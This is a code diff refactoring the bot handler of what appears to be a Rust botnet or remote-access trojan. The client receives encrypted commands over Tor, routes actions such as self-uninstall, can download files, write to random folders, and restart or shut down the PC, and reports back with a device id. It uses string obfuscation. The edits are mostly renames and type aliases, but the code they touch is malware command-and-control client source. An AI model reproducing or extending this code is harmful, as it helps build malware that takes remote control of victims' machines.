@@ -10,7 +10,7 @@ use client_vars::{
 };
 use shared::{
     constants::communication_encryption_key,
-    network::tor::{ LoggerCnfg, SrvRcvTp, TrHandler },
+    network::tor::{ LoggerCnfg, MutexPtr, RwPtr, SrvRcvTp, TrHandler },
     utils::{
         encryption::{ convert_key_to_bytes, sauron_decrypt },
         functions::{ restart_pc_instant, shutdown_pc_instant, write_file_to_random_folder },
@@ -31,9 +31,9 @@ use super::basic::download_file_to_path;
 
 #[derive(Clone)]
 pub struct BotHandler {
-    tor_handler: TrHandler,
-    bot_state: Arc<RwLock<BotState>>,
-    terminal: Option<Arc<Mutex<Terminal>>>,
+    tr_handler: TrHandler,
+    bot_state: RwPtr<BotState>,
+    terminal: Option<MutexPtr<Terminal>>,
 }
 
 impl BotHandler {
@@ -49,7 +49,7 @@ impl BotHandler {
             }
         };
         Ok(BotHandler {
-            tor_handler,
+            tr_handler: tor_handler,
             bot_state: Arc::new(RwLock::new(bot_state)),
             terminal,
         })
@@ -57,15 +57,14 @@ impl BotHandler {
 
     pub async fn run_handler(&mut self) {
         let self_clone = Arc::new(RwLock::new(self.clone()));
-        let self_clone2 = self_clone.clone();
 
-        self.tor_handler.run::<_, _, BotHandler>(
+        self.tr_handler.run::<_, _, BotHandler>(
             self_clone,
             Self::receive_data,
             Self::connect_callback_init
         ).await;
     }
-    fn receive_data(self_ref: Arc<RwLock<Self>>, raw_data: Vec<u8>) {
+    fn receive_data(self_ref: RwPtr<Self>, raw_data: Vec<u8>) {
         tokio::task::spawn(async move {
             if
                 let Ok(decrypted_data) = sauron_decrypt(
@@ -84,7 +83,7 @@ impl BotHandler {
             }
         });
     }
-    pub fn connect_callback_init(self_ref: Arc<RwLock<Self>>) {
+    fn connect_callback_init(self_ref: RwPtr<Self>) {
         tokio::task::spawn(async move {
             info!("connect_callback_init");
 
@@ -103,7 +102,7 @@ impl BotHandler {
         });
     }
 
-    async fn process_data(binary_data: Vec<u8>, self_ref: Arc<RwLock<Self>>) -> Result<()> {
+    async fn process_data(binary_data: Vec<u8>, self_ref: RwPtr<Self>) -> Result<()> {
         let processed_data: BoogeymanReceivePayload = serde_json
             ::from_slice(&binary_data)
             .context(s!("Failed to parse binary data as LoaderReceivePayload").to_string())?;
@@ -113,7 +112,7 @@ impl BotHandler {
 
     async fn route_data(
         processed_data: BoogeymanReceivePayload,
-        self_ref: Arc<RwLock<Self>>
+        self_ref: RwPtr<Self>
     ) -> Result<()> {
         match processed_data.action {
             receive::ClientAction::UninstallSelf => {}
@@ -317,12 +316,13 @@ impl BotHandler {
         Ok(())
     }
     async fn send_data(
-        self_ref: Arc<RwLock<Self>>,
+        self_ref: RwPtr<Self>,
         action: ServerAction,
         params: ServerParams
     ) -> Result<()> {
         info!("SENDING DATA");
-        let tor_h = &self_ref.read().await.tor_handler;
+        let tor_h = &self_ref.read().await.tr_handler;
+
         let payload = BoogeymanSendPayload {
             id: tor_h.dv_id.read().await.to_owned(),
             version: client_version(),
